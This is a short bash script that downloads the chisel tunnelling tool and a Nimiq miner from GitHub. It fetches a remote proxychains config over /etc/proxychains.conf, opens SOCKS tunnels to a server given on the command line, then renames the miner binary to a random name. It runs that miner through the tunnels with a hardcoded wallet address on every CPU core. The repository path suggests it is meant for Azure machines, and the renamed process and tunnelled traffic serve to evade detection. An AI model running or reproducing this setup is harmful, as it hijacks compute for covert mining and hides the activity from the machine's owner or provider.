#!/bin/bash
pkill chisel
rm -rf wget-log*
wget -q https://github.com/jpillora/chisel/releases/download/1.3.1/chisel_linux_amd64.gz -O chisel_linux_amd64.gz
#gunzip "chisel_linux_amd64.gz"  && chmod 777 chisel_linux_amd64
[[ -e "chisel_linux_amd64" ]] || gunzip "chisel_linux_amd64.gz"  && chmod 777 chisel_linux_amd64
port1=$RANDOM
port2=$RANDOM
port3=$RANDOM
port4=$RANDOM
port5=$RANDOM
./chisel_linux_amd64 client --keepalive 90m $1 $port1:socks $port2:socks $port3:socks $port4:socks $port5:socks & >/dev/null
apt install -y proxychains unzip
wget -q https://raw.githubusercontent.com/Vinhuit/azurenimpool/master/azure_script/pchain.conf -O pchain.conf
cp -rf pchain.conf /etc/proxychains.conf
sed -i "s/9050/${port1}/g"  /etc/proxychains.conf
sed -i "s/9051/${port2}/g"  /etc/proxychains.conf
sed -i "s/9052/${port3}/g"  /etc/proxychains.conf
sed -i "s/9053/${port4}/g"  /etc/proxychains.conf
sed -i "s/9054/${port5}/g"  /etc/proxychains.conf
sleep 10
#sed -i 's/proxy_dns/#proxy_dns/g'  /etc/proxychains.conf
sudo proxychains curl ifconfig.me
#latest beta-miner
rm -rf beepminer*
wget https://github.com/Beeppool/miner/releases/download/0.6.1/beepminer-0.6.1.zip
unzip beepminer-0.6.1.zip
name=$RANDOM
for i in `seq 1 4`;
do
    cd beepminer-0.6.1
    mv miner $name
    pgrep $name ||sudo proxychains ./$name --wallet-address="NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U" --pool=$2 --deviceLabel=$hostname --type=dumb --miner=$(($(grep -c ^processor /proc/cpuinfo)-0))
done
